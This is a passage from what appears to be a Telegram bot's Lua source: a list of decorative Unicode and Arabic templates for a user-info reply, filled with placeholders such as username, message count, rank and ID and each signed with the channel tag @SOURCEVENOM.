🇪🇬 ꙰  - 𝚞 𝚜𝚎 𝚛 ➟ #username  ❃.
🇪🇬 ꙰  - 𝚖 𝚜𝚐 𝚜 ➟ #msgs ❃.
🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
🌯 ¦✙• 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
🌯 ¦✙• 𝐦𝐬𝐠 ➢ ⁞  #msgs  📝
🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
🌯 ¦✙• 𝐢𝐝 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
🌯 ¦ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪??.
¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
¦• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖??𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝐢𝐝 𓂅 #id 𓍯➸💞.
➞: 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
➼ : 𝐼𝐷 𖠀 #id . ♡
➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
➼ : 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
▽ ¦❀• USER ➭ ⁞ #username .
▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
▽ ¦❀• STAT ➬ ⁞ #stast  .
▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
▽ ¦❀• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
• ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
• ❉ 𝑺𝑻𝑨 : #stast .
• ❉ 𝑰𝑫 : #id  ‌‌‏.
• ❉  𝑴𝑺𝑮 : #msgs 𓆊.
• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
• ❉ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
|USERNAME #username 𓃚
| YOUR -ID - #id 𓃚
| STAS-#stast 𓃚
 | MSAG - #msgs 𓃚
 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
𝟔𝟔𝟔 𖡋 #username • 𖣰💞
??𝟔𝟔 𖡋  #stast •??💞
𝟔𝟔𝟔 𖡋 #id • 𖣰💞
𝟔𝟔𝟔 𖡋 #game • 𖣰💞
𝟔𝟔𝟔 𖡋 #msgs • 𖣰💞
𝟔𝟔𝟔 𖡋 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
 𖥔 - 𝓾𝓼𝓮𝓻 ➪ #username 𖥔.
 𖥔 - ??𝓽𝓪𝓼𝓽  ➪ #stast 𖥔.
 𖥔 - 𝓲𝓭 ➪ #id ⸙ 𖥔.
 𖥔 - 𝓰𝓶𝓪𝓼 ➪ #gmas ⸙ 𖥔.
 𖥔 - 𝓶𝓼𝓰𝓼 ➪ #msgs 𖥔.
 𖥔 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
- 𝄬 username . #username ➪🇪🇬
 - 𝄬 stast . #stast ➪🇪🇬
 - 𝄬 id . #id ➪🇪🇬
 - 𝄬 msgs . #msgs ➪🇪🇬
 - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
◣: 𝒔𝒕𝒂𓂅 #stast 𓍯➥♡.
◣: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➥♡.
◣: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➥♡.
◣: 𝐢𝐝 𓂅 #id 𓍯➥♡.
◣: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
↣• USE ➤ #username  ↝🍬.
↣• MSG ➤  #msgs  ↝🍬.
↣• STA ➤  #stast  ↝🍬.
↣• iD ➤ #id  ↝🍬.
↣• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
➫✿: S #stast 𓍯➟♡.
➫✿: U𓂅 #username 𓍯➟♡.
➫✿: M𓂅 #msgs 𓍯➟♡.
➫✿:  I  #id ➟♡.
➫✿: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
✶- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯↝❃.
✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
✶- 𝐢𝐝 𓂅 #id 𓍯↝❃.
✶- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
• 🖤 | 𝑼𝑬𝑺 :  #username

• 🖤 | 𝑺𝑻𝑨 : #stast

• 🖤 | 𝑰𝑫 :  #id

• 🖤 | 𝑴𝑺𝑮 : #msgs

• 🖤 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
• USE 𖦹 #username 
• MSG 𖥳 #msgs  
• STA 𖦹 #stast 
• iD 𖥳 #id
• 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
- ᴅᴇᴛᴀɪʟs ➣ #auto . 
-  ɢᴀᴍᴇ ➣ #game .
- 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
⚕𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 : #username
⚕𝙈𝙀𝙎𝙎𝘼𝙂𝙀𝙎 : #msgs
⚕𝙎𝙏𝘼𝙏𝙎 : #stast
⚕𝙄𝘿 : #id
⚕𝙅𝙀𝙒𝙀𝙇𝙎 : #game
⚕𝘿𝙀𝙑 : #ridha
⚕𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
• 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🦄 | 𝑺𝑻𝑨 : #stast ☥
• 🦄 | 𝑰𝑫 : #id ‌‌‏♕
• 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
• 🦄 | 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
• △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• ▽ | 𝑺𝑻𝑨 : #stast ☥
• ⊠ | 𝑰𝑫 : #id ‌‌‏♕
• ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
• ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
• ❏ | 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
┇iD ➺ #id 💘
┇UsEr ➺ #username 💕
┇MsG ➺ #msgs 🧸 
┇StAtE ➺ #stast 🎀
┇EdIT ➺ #edit  💒
┇𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
• 🖤 | 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
┄─━━ 𖥔━━─┄
𖣤 ᴜѕᴇʀɴᴀᴍᴇ 𓄹𓄼 #id 🇪🇬
𖦼 ʏᴏᴜʀ ɪᴅ 𓄹𓄼 #username  💛
𖥪 ᴍѕɢѕ 𓄹𓄼 #msgs ✉️
𖥧 ѕᴛᴀᴛѕ 𓄹𓄼 #stast 👩🏿‍🚒 
𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
✰ ᴄʜ ᴇʟɪɴ ➣ #edit
┄─━━ 𖥔━━─┄
✰ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊
𓄼 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
• ﮼ايديك  #id 🌻 ٬
• ﮼يوزرك ➺ #username 🌻 ٬
• ﮼مسجاتك ➺ #msgs 🌻 ٬
•  ﮼رتبتك➺ #stast 🌻 ٬
• ﮼تعديلك ➺ #edit 🌻 ٬
• ﮼ تعين ➺ 「@SOURCEVENOM」 💞.
]],
[[
‎⿻┊Yor iD 𖠄 #id ٫
‌‎⿻┊UsEr 𖠄 #username ٫
‌‎⿻┊MsGs 𖠄 #msgs ٫
‌‎⿻┊StAtS 𖠄 #stast ٫
‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
‌‎⿻┊‌‎𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
⌾ | 𝐢𝐝  𓃠 #id .
⌾ | 𝐮𝐬??𝐫 𓃠 #username .
⌾ | 𝐦𝐬𝐠 𓃠 #msgs .
⌾ | 𝐬??𝐚 𓃠 #stast .
⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
⌾ | 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
♡ : 𝐼𝐷 𖠀 #id .
♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
♡ : 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
•ᑌᔕᗴᖇ- #username 
•ᔕTᗩ- #stast 
•ᗰᔕ- #msgs 
•Iᗪ- #id
•𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
• USE ➤ #username  .
• MSG ➤  #msgs  .
• STA ➤  #stast  .
• iD ➤ #id  .
• 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
𝐘𝐨𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
𝗖𝗛☤🇪🇬 - 「@SOURCEVENOM」 𖥔.
]],
[[
⭐️𝖘𝖙𝖆 : #stast ـ🍭
⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
⭐️𝖎𝖉 : #id ـ 🍭
⭐️𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
• 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
• 🇪🇬 - 𝙸𝙳 « #id  🍭
• 🇪🇬 - 𝙼𝚂𝙶𝚂 « #msgs  🍭
• 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
• 🇪🇬 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
• USE ➤  #username .
• MSG ➤  #msgs .
• STA ➤  #stast .
• iD ➤ #id .
• 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
🇪?? - 𝄬 ᴵᴰ . #id 𓃠
🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
🇪🇬 - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
𓄼🇪🇬 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
𓄼🇪🇬 𝐢𝐝 : #id ‌‌‏⚚
𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
𓄼🇪🇬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
Usᴇʀ Nᴀᴍᴇ ~ #username 
Yᴏᴜʀ ɪᴅ ~ #id 
Sᴛᴀsᴛ ~ #stast 
Msᴀɢ ~ #msgs
𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
- 🇪🇬 UsErNaMe . #username 𖠲
- 🇪🇬 StAsT . #stast 𖠲
- 🇪🇬 Id . #id 𖠲
- 🇪🇬 GaMeS . #game 𖠲
- 🇪🇬 MsGs . #msgs 𖠲
- 🇪🇬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
🇪🇬 - 𝄬 username . #username  𓃠
🇪🇬 - 𝄬 stast . #stast  ??
🇪🇬 - ?? id . #id 𓃠
🇪🇬 - 𝄬 gmas . #gmas 𓃠
🇪🇬 - 𝄬 msgs . #msgs  𓃠
🇪?? - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
金 - 𝓲𝓭 . #id ⸙ 
金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
金 - 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
➜𝗨𝗦??𝗥𝗡𝗔𝗠𝗘 : #username
➜𝗠𝗘𝗦𝗦𝗔𝗚𝗘𝗦 : #msgs
➜𝗦𝗧𝗔𝗧𝗦 : #stast
➜𝗜𝗗 : #id
➜𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
⌔┇Msgs : #msgs.
⌔┇ID : #id.
⌔┇Stast : #stast.
⌔┇UserName : #username.
⌔┇𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
𝒔𝒕𝒂𓂅 #stast 𓍯
𝐮𝐬𝐞𝐫𓂅 #username 𓍯
𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯
𝐢𝐝 𓂅 #id 𓍯
𓂅 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
- 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
- 🇪🇬 𝐢𝐝 . #id 𖣂.
- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
- 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
- 🇪🇬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast ??🇬 ꙰
ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
ᯓ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  🖤 ↴
.𖣂 𝙡𝘿 , #id  🖤 ↴
.𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
.𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
.𖣂 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
➥• USE 𖦹 #username - 🇪🇬.
➥• MSG 𖥳 #msgs  - 🇪🇬.
➥• STA 𖦹 #stast - 🇪🇬.
➥• iD 𖥳 #id - 🇪🇬.
➥• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
👳🏼‍♂ - 𝄬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
➭- 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
𓄼 ᴜѕᴇ : #username ♕
𓄼 ѕᴛᴀ : #stast  ☥
𓄼 ɪᴅ : #id ‌‌‏⚚
𓄼 ᴍѕɢ : #msgs 𓆊 
𓐀 𝑾𝒆𝒍𝒄𝒐??𝒆 𓀃.
𓄼 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
𝐓𝐓• 𝐌𝐬𝐠𝐒 𖠰 #msgs .
𝐓𝐓• 𝐔𝐬𝐞??𝐍𝐚 𖠰 #username .
𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
𝐓𝐓• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
𝟓 𝟔 𖡻 #auto  ࿇🦄
𝟓 𝟔 𖡻 #stast  ࿇🦄
𝟓 𝟔 𖡻 #id  ࿇🦄
𝟓 𝟔 𖡻 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
༻┉𖦹┉┉𖦹┉┉𖦹┉┉𖦹┉༺
• |𝗜𝗗  ⁞ #id
• |𝗨𝗦𝗘 ⁞ #username
• |𝗦𝗧𝗔  ⁞ #stast
• |𝗠𝗦𝗚  ⁞ #edit
• |𝗔𝗨𝗧𝗢 ⁞ #auto
—————————————
𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
┄─━━𖦹━━─┄
𖣰𖡻 ??𝗜𝗗• #id •𓀎
𖣰𖡻 𖡋𝗨𝗦𝗘• #username •𓀎
𖣰𖡻 𖡋𝗦𝗧𝗔• #stast •𓀎
𖣰𖡻 𖡋𝗠𝗦𝗚• #msgs •𓀎
??𖡻 𖡋𝗔𝗨𝗧𝗢• #auto •𓀎
𖣰𖡻 𖡋𝗘𝗗𝗜𝗧• #edit • 𓀎
┄─━━𖦹━━─┄
𝗖𝗛 - 「@SOURCEVENOM」  𖦹 .
]],
[[
𖤍 |↶ #id    ꙰🇪🇬.
𖤍 |↶ #username    ꙰🇪🇬.
𖤍 |↶ #msgs    ꙰🇪🇬.
𖤍 |↶ #stast    ꙰🇪🇬.
𖤍 |↶ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 𝗨𝗦𝗘𝗥 ⟿ #username  « 
 𝗠𝗦??𝗦 ⟿  #msgs  « 
 𝗦𝗧𝗔 ⟿ #stast  « 
 𝗜𝗗  ⟿ #id  « 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
🇪🇬≪💎≫ #username • メ
🇪🇬≪💎≫ #stast  •メ
🇪🇬≪💎≫ #id  • メ
🇪🇬≪💎≫ #msgs  •メ
🇪🇬≪💎≫ #game •メ
🇪🇬𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
 𝚄𝚂𝙴?? 𓄹𓄼 #username
 𝙸𝙳  𓄹𓄼 #id 
 𝚂𝚃𝙰 𓄹𓄼 #stast 
 𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
𓅓➪ : Iᗪ : #id - ❦ . 
𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
𓅓➪ : 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- ايديڪ  ⁞ #id 💘 ٬
- يوزرڪ القميل ⁞ #username 💘 ٬
- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
- رتبتڪ الحلوه ⁞ #stast  💘٬
- سحڪاتڪ الفول ⁞ #edit 💘 ٬
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
𓁷 - 𝙞𝙙 †: #id 𓀀 .
𓁷 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𖡋 𝐔𝐒𝐄 #username 
𖡋 𝐌𝐒𝐆 #msgs 
𖡋 𝐒𝐓𝐀 #stast 
𖡋 𝐈𝐃 #id 
𖡋 𝐄𝐃𝐈𝐓 #edit
𖡋 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
𖤂 ~ 𝑚𝑠𝑔 #msgs 𖤐
𖤂 ~ 𝑠𝑡𝑎 #stast  
𖤂 ~ 𝑖𝑑 #id 𖤐
𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
𖤂 ~ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
-›   𝙼??𝙶𝚂 . #msgs 🇪🇬 ꙰
-›   𝗖𝗛 - 「@SOURCEVENOM」 🇪🇬 ꙰.
]],
[[
••• ••• ••• ••• ••• ••• ••• 
࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
 ࿕ ¦• 𝙈𝙎𝙂??   ⟿ #msgs ༆
 ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
 ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
••• ••• ••• ••• ••• ••• •••
 ࿕ ¦• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
► 𝗜?? #id 𓃚 ꙰
► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
► 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- UsEr🇪🇬 ꙰ #username
- StA🇪🇬 ꙰   #msgs
- MsGs🇪🇬 ꙰ #stast
- ID🇪🇬 ꙰  #id
- 𝗖𝗛 🇪🇬 ꙰  「@SOURCEVENOM」 𖥔
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
- 𓏬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
ᯓ 𝟔𝟔𝟔𖡋 #stast  •✟
ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
ᯓ 𝟔𝟔𝟔𖡋 #game •✟
ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
 𖥔•𝐮𝐬𝐞𝐫 : #username 𖣬  
 𖥔•𝐦𝐬𝐠  : #msgs 𖣬 
 𖥔•𝐬𝐭𝐚 : #stast 𖣬 
 𖥔•𝐢𝐝  : #id 𖣬
 𖥔•𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- ᴜѕʀ: #username ঌ.
- ᴍѕɢ: #msgs  ঌ.
- ѕᴛᴀ: #stast  ঌ.
- ɪᴅ: #id ঌ.
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
- 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
- 𝑚𝑠𝑔𝑠 ⟿ #msgs
- 𝑖𝑑 ⟿ #id
- 𝑒𝑑𝑖𝑡 ⟿ #edit
- 𝑔𝑎𝑚𝑒 ⟿ #game
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
🌯 ¦✙• 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 ➢ ⁞  #username 🇪🇬
🌯 ¦✙• 𝐦𝐬𝐠 ➢ ⁞  #msgs  📝
🌯 ¦✙• 𝒓𝒂𝒏𝒌 ➢ ⁞ #stast  
🌯 ¦✙• 𝐢𝐝 𝒔𝒕𝒂 ➢ ⁞ #id  🆔
🌯 ¦ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝚞 𝚜𝚎 𝚛 ➟ #username  ❃.
🇪🇬 ꙰  - 𝚖 𝚜𝚐 𝚜 ➟ #msgs ❃.
🇪🇬 ꙰  - 𝚐 𝚖 𝚊𝚜  ➟ #stast ❃.
🇪🇬 ꙰  - 𝙸𝙳 𝚜𝚝𝚊   ➟ #id ❃.
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 ꙰  - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
¦• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇪🇬.
¦• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇪🇬.
¦• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇪🇬.
¦• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇪🇬.
¦• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝐮𝐬𝐞𝐫𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: ??𝒅 𓂅 #id 𓍯➸💞.
➞: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔
]],
[[
➼ : 𝐼𝐷 𖠀 #id . ♡
➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
